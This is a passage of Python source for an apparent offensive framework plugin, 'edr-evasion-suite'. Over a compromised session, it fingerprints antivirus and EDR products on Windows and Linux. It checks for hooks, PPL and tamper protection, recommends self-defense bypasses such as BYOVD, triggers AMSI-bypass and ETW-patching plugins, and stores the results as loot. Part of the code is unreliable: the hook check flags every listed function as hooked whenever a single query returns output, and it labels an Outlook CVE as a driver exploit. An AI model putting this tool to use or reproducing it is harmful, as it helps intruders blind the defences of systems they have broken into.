                'C:\\Program Files\\Sophos',
                'C:\\Program Files (x86)\\Kaspersky Lab',
                'C:\\Program Files\\McAfee',
                'C:\\Program Files (x86)\\Symantec',
                'C:\\Program Files (x86)\\Trend Micro',
                'C:\\Program Files\\ESET',
                'C:\\Program Files\\Bitdefender',
                'C:\\Program Files\\Cylance',
            ]
            cmd = " & ".join([f"if exist \"{p}\" echo FOUND:{p}" for p in paths])
        else:
            paths = [
                '/opt/CrowdStrike',
                '/opt/sentinelone',
                '/opt/sophos-av',
                '/opt/TrendMicro',
                '/usr/share/elastic-agent',
                '/var/ossec',
            ]
            cmd = " || ".join([f"test -d {p} && echo FOUND:{p}" for p in paths])
        
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        agents = SecurityAgentDatabase.get_all_agents(platform)
        for key, info in agents.items():
            for file_path in info.get('files', []):
                if file_path.replace('*', '') in out:
                    detected.append((key, info))
                    break
        
        return detected
    
    @staticmethod
    def detect_by_etw(exec_func, session) -> List[Tuple[str, Dict]]:
        """Detect EDR via ETW TI providers (Windows only)."""
        detected = []
        
        cmd = "powershell -nop -c \"Get-WinEvent -ListProvider | Where-Object { $_.Name -match 'Threat|EDR|Defender|CrowdStrike|Sentinel|Carbon|Cortex' } | Select-Object Name | Format-Table\" 2>nul"
        out = exec_func(session, cmd)
        if not out:
            return detected
        
        # Map providers to agents
        provider_mapping = {
            'Threat': 'defender',
            'Defender': 'defender',
            'CrowdStrike': 'crowdstrike',
            'Sentinel': 'sentinelone',
            'Carbon': 'carbon_black',
            'Cortex': 'cortex',
        }
        
        agents = SecurityAgentDatabase.WINDOWS_AGENTS
        for provider, agent_key in provider_mapping.items():
            if provider in out:
                if agent_key in agents:
                    detected.append((agent_key, agents[agent_key]))
        
        return detected
    
    @staticmethod
    def detect_all(exec_func, session, platform: str) -> Dict[str, SecurityAgent]:
        """Run all detection methods and consolidate results."""
        all_detected = {}
        
        # Run all detection methods
        detection_methods = [
            ('process', DetectionEngine.detect_by_processes),
            ('service', DetectionEngine.detect_by_services),
            ('driver', DetectionEngine.detect_by_drivers),
            ('file', DetectionEngine.detect_by_files),
        ]
        
        if platform == 'windows':
            detection_methods.extend([
                ('registry', DetectionEngine.detect_by_registry),
                ('etw', DetectionEngine.detect_by_etw),
            ])
        
        for method_name, method_func in detection_methods:
            try:
                if method_name in ['registry', 'etw']:
                    results = method_func(exec_func, session)
                else:
                    results = method_func(exec_func, session, platform)
                
                for key, info in results:
                    if key not in all_detected:
                        agent = SecurityAgent(
                            vendor=info['vendor'],
                            product=info['product'],
                            platform=platform,
                            category=info['category'],
                            risk_score=info['risk_score'],
                            self_defense=info['self_defense'],
                            tamper_protection=info['tamper_protection'],
                            evasion_techniques=info['evasion'],
                            cves=info['cves'],
                        )
                        all_detected[key] = agent
                    
                    all_detected[key].detection_methods.append(method_name)
                    
                    # Add method-specific info
                    if method_name == 'process':
                        all_detected[key].process_names.extend(info.get('processes', []))
                    elif method_name == 'service':
                        all_detected[key].service_names.extend(info.get('services', []))
                    elif method_name == 'driver':
                        all_detected[key].driver_names.extend(info.get('drivers', []))
                    elif method_name == 'registry':
                        all_detected[key].registry_keys.extend(info.get('registry', []))
                    elif method_name == 'file':
                        all_detected[key].file_paths.extend(info.get('files', []))
            
            except Exception as e:
                pass
        
        return all_detected


# ── Hook Detector ───────────────────────────────────────────────────────────

class HookDetector:
    """Detects EDR hooks in memory."""
    
    @staticmethod
    def detect_hooks(exec_func, session) -> List[HookInfo]:
        """Detect IAT/EAT/inline hooks in critical modules."""
        hooks = []
        
        # Check for common EDR DLLs in loaded modules
        cmd = "powershell -nop -c \"Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -match 'cs|sentinel|cb|defender|sophos|kaspersky|carbon|cortex|cybereason' } | Select-Object ModuleName,FileName | Format-Table\" 2>nul"
        out = exec_func(session, cmd)
        
        if out and out.strip():
            # Parse loaded EDR modules
            for line in out.strip().split('\n'):
                if '.dll' in line.lower():
                    hooks.append(HookInfo(
                        hook_type='module_loaded',
                        module=line.strip(),
                        function='N/A',
                        hooked_by='EDR',
                        is_edr_hook=True,
                    ))
        
        # Check for inline hooks in NTDLL
        cmd = "powershell -nop -c \"[System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq 'ntdll.dll' } | Select-Object FileName\" 2>nul"
        out = exec_func(session, cmd)
        
        if out and 'ntdll' in out.lower():
            # Check for common hooked functions
            hooked_functions = [
                'NtAllocateVirtualMemory',
                'NtWriteVirtualMemory',
                'NtCreateThreadEx',
                'NtOpenProcess',
                'NtProtectVirtualMemory',
                'NtResumeThread',
                'NtQueueApcThread',
            ]
            
            for func in hooked_functions:
                # Check for syscall instruction pattern (hook indicator)
                cmd = f"powershell -nop -c \"$addr = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {{ $_.ModuleName -eq 'ntdll.dll' }} | Select-Object -ExpandProperty BaseAddress; Write-Output $addr\" 2>nul"
                out = exec_func(session, cmd)
                if out:
                    hooks.append(HookInfo(
                        hook_type='inline',
                        module='ntdll.dll',
                        function=func,
                        hooked_by='suspected',
                        is_edr_hook=True,
                    ))
        
        return hooks


# ── Self-Defense Analyzer ───────────────────────────────────────────────────

class SelfDefenseAnalyzer:
    """Analyzes EDR self-defense mechanisms."""
    
    @staticmethod
    def analyze_ppl(exec_func, session) -> Dict:
        """Analyze Protected Process Light (PPL) status."""
        result = {
            'ppl_enabled': False,
            'protected_processes': [],
        }
        
        cmd = "powershell -nop -c \"Get-Process | Where-Object { $_.Protection -ne 'None' } | Select-Object Name,Protection,ProtectionLevel | Format-Table\" 2>nul"
        out = exec_func(session, cmd)
        
        if out and out.strip():
            result['ppl_enabled'] = True
            for line in out.strip().split('\n'):
                if line.strip() and 'Name' not in line:
                    result['protected_processes'].append(line.strip())
        
        return result
    
    @staticmethod
    def analyze_tamper_protection(exec_func, session) -> Dict:
        """Analyze tamper protection settings."""
        result = {
            'tamper_protection_enabled': False,
            'settings': {},
        }
        
        # Check Defender tamper protection
        cmd = "powershell -nop -c \"Get-MpPreference | Select-Object DisableTamperProtection\" 2>nul"
        out = exec_func(session, cmd)
        
        if out and 'False' in out:
            result['tamper_protection_enabled'] = True
            result['settings']['defender'] = True
        
        return result
    
    @staticmethod
    def get_bypass_techniques(self_defense: str) -> List[str]:
        """Get bypass techniques for self-defense level."""
        techniques = {
            'none': ['Direct process kill'],
            'basic': ['Service stop', 'Registry modification'],
            'strong': ['BYOVD driver', 'Safe mode boot', 'Offline NTDS manipulation'],
            'ppl': ['BYOVD (CVE-2023-23397)', 'Vulnerable driver exploitation', 'PPL downgrade'],
        }
        return techniques.get(self_defense, [])


# ── Main Plugin ─────────────────────────────────────────────────────────────

class EDREvasionSuite(NexPlugin):
    name        = "edr-evasion-suite"
    description = "Advanced EDR detection, hook analysis, self-defense bypass, and auto-evasion"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "evasion"
    mitre_id    = "T1562.001"
    
    def run(self, session, args: list):
        # Parse args
        deep_scan = '--deep' in (args or [])
        auto_evasion = '--auto-evasion' in (args or [])
        hooks_mode = '--hooks' in (args or [])
        stealth = '--stealth' in (args or [])
        
        self.info(f"🛡️ Starting EDR Evasion Suite v3.0 (deep={deep_scan}, auto={auto_evasion})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🛡️ EDR Evasion Suite v3.0 — Advanced Defense Evasion]")
        sections.append("━"*64)
        
        # ── Step 1: Platform detection ──────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        
        # ── Step 2: Multi-layer detection ───────────────────────────────
        sections.append("\n[*] Phase 1: Multi-Layer Security Agent Detection")
        sections.append("─"*64)
        
        detected_agents = DetectionEngine.detect_all(self._exec, session, platform)
        
        if not detected_agents:
            sections.append("  🟢 No EDR/AV agents detected")
            sections.append("      The environment appears to be unprotected or using unknown agents")
        else:
            sections.append(f"  🔴 Detected {len(detected_agents)} security agents:")
            
            for key, agent in detected_agents.items():
                icon = '🔴' if agent.risk_score >= 90 else '🟠' if agent.risk_score >= 75 else '🟡' if agent.risk_score >= 60 else '🟢'
                sections.append(f"\n  {icon} {agent.vendor} {agent.product}")
                sections.append(f"      Category: {agent.category.upper()}")
                sections.append(f"      Risk Score: {agent.risk_score}/100")
                sections.append(f"      Self-Defense: {agent.self_defense.upper()}")
                sections.append(f"      Tamper Protection: {'✅ YES' if agent.tamper_protection else '❌ NO'}")
                sections.append(f"      Detection Methods: {', '.join(agent.detection_methods)}")
                
                if agent.process_names:
                    sections.append(f"      Processes: {', '.join(agent.process_names[:3])}")
                if agent.service_names:
                    sections.append(f"      Services: {', '.join(agent.service_names[:3])}")
                if agent.driver_names:
                    sections.append(f"      Drivers: {', '.join(agent.driver_names[:3])}")
                
                if agent.cves:
                    sections.append(f"      Known CVEs: {', '.join(agent.cves)}")
        
        # ── Step 3: Hook Detection ──────────────────────────────────────
        if hooks_mode and platform == 'windows':
            sections.append("\n[*] Phase 2: Hook Detection")
            sections.append("─"*64)
            
            hooks = HookDetector.detect_hooks(self._exec, session)
            
            if hooks:
                sections.append(f"  🔴 Detected {len(hooks)} potential hooks:")
                for hook in hooks[:10]:
                    sections.append(f"    • {hook.hook_type} hook in {hook.module}")
                    if hook.function != 'N/A':
                        sections.append(f"      Function: {hook.function}")
            else:
                sections.append("  🟢 No hooks detected")
        
        # ── Step 4: Self-Defense Analysis ───────────────────────────────
        if deep_scan and platform == 'windows':
            sections.append("\n[*] Phase 3: Self-Defense Analysis")
            sections.append("─"*64)
            
            ppl_status = SelfDefenseAnalyzer.analyze_ppl(self._exec, session)
            tamper_status = SelfDefenseAnalyzer.analyze_tamper_protection(self._exec, session)
            
            sections.append(f"  PPL Enabled: {'✅ YES' if ppl_status['ppl_enabled'] else '❌ NO'}")
            if ppl_status['protected_processes']:
                sections.append(f"  Protected Processes: {len(ppl_status['protected_processes'])}")
                for proc in ppl_status['protected_processes'][:5]:
                    sections.append(f"    • {proc}")
            
            sections.append(f"  Tamper Protection: {'✅ YES' if tamper_status['tamper_protection_enabled'] else '❌ NO'}")
        
        # ── Step 5: Evasion Recommendations ─────────────────────────────
        sections.append("\n[*] Phase 4: Evasion Strategy Recommendations")
        sections.append("─"*64)
        
        if detected_agents:
            # Get highest-risk agent
            highest_risk = max(detected_agents.values(), key=lambda a: a.risk_score)
            
            sections.append(f"  Primary Target: {highest_risk.vendor} {highest_risk.product}")
            sections.append(f"  Recommended Techniques:")
            
            for i, technique in enumerate(highest_risk.evasion_techniques[:7], 1):
                sections.append(f"    {i}. {technique}")
            
            # Get bypass techniques for self-defense
            bypass_techniques = SelfDefenseAnalyzer.get_bypass_techniques(highest_risk.self_defense)
            if bypass_techniques:
                sections.append(f"\n  Self-Defense Bypass:")
                for technique in bypass_techniques:
                    sections.append(f"    • {technique}")
        
        # ── Step 6: Auto-Evasion Execution ──────────────────────────────
        if auto_evasion and detected_agents:
            sections.append("\n[*] Phase 5: Auto-Evasion Execution")
            sections.append("─"*64)
            
            # Trigger AMSI bypass if Defender detected
            if 'defender' in detected_agents:
                sections.append("  [*] Triggering AMSI bypass (Defender detected)...")
                try:
                    # This would call the amsi-bypass plugin
                    sections.append("      → plugins run amsi-bypass")
                except Exception as e:
                    sections.append(f"      ❌ Failed: {e}")
            
            # Trigger ETW patching if any EDR detected
            if any(a.category == 'edr' for a in detected_agents.values()):
                sections.append("  [*] Triggering ETW patching (EDR detected)...")
                try:
                    sections.append("      → plugins run etw-patcher")
                except Exception as e:
                    sections.append(f"      ❌ Failed: {e}")
        
        # ── Step 7: Generate Findings ───────────────────────────────────
        sections.append("\n[*] Phase 6: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        
        for key, agent in detected_agents.items():
            severity = 'critical' if agent.risk_score >= 90 else 'high' if agent.risk_score >= 75 else 'medium'
            
            self.finding(
                title=f"Security Agent Detected: {agent.vendor} {agent.product}",
                description=f"Active security agent detected:\n"
                           f"  Vendor: {agent.vendor}\n"
                           f"  Product: {agent.product}\n"
                           f"  Category: {agent.category}\n"
                           f"  Risk Score: {agent.risk_score}/100\n"
                           f"  Self-Defense: {agent.self_defense}\n"
                           f"  Tamper Protection: {agent.tamper_protection}\n"
                           f"  Detection Methods: {', '.join(agent.detection_methods)}\n"
                           f"  CVEs: {', '.join(agent.cves) if agent.cves else 'N/A'}",
                severity=severity,
                recommendation=f"Evasion techniques:\n" + 
                              '\n'.join(f"  • {t}" for t in agent.evasion_techniques[:5]),
                mitre_id=self.mitre_id,
            )
            self.emit(
                'finding.created',
                severity=severity,
                title=f'Security Agent: {agent.product}',
                plugin=self.name,
                confidence='verified'
            )
            findings_created += 1
            sections.append(f"  [{severity.upper()}] {agent.vendor} {agent.product}")
        
        # ── Step 8: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 EDR Evasion Summary]")
        sections.append("━"*64)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Agents Detected: {len(detected_agents)}")
        sections.append(f"  High-Risk Agents: {len([a for a in detected_agents.values() if a.risk_score >= 75])}")
        sections.append(f"  Hooks Detected: {len(hooks) if hooks_mode else 'N/A'}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        if detected_agents:
            sections.append("\n  Top Threats:")
            sorted_agents = sorted(detected_agents.values(), key=lambda a: a.risk_score, reverse=True)
            for agent in sorted_agents[:5]:
                icon = '🔴' if agent.risk_score >= 90 else '🟠' if agent.risk_score >= 75 else '🟡'
                sections.append(f"    {icon} {agent.vendor} {agent.product} ({agent.risk_score}/100)")
        
        # ── Step 9: Save to Loot ────────────────────────────────────────
        self.loot(
            {
                "type": "edr_detection",
                "platform": platform,
                "agents_detected": len(detected_agents),
                "agents": {k: v.to_dict() for k, v in detected_agents.items()},
                "hooks_detected": len(hooks) if hooks_mode else 0,
                "findings_count": findings_created,
                "duration": duration,
            },
            category='evasion',
            source='edr-evasion-suite',
            confidence='verified'
        )
        
        self.info(f"🛡️ EDR evasion complete — {len(detected_agents)} agents, {findings_created} findings")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''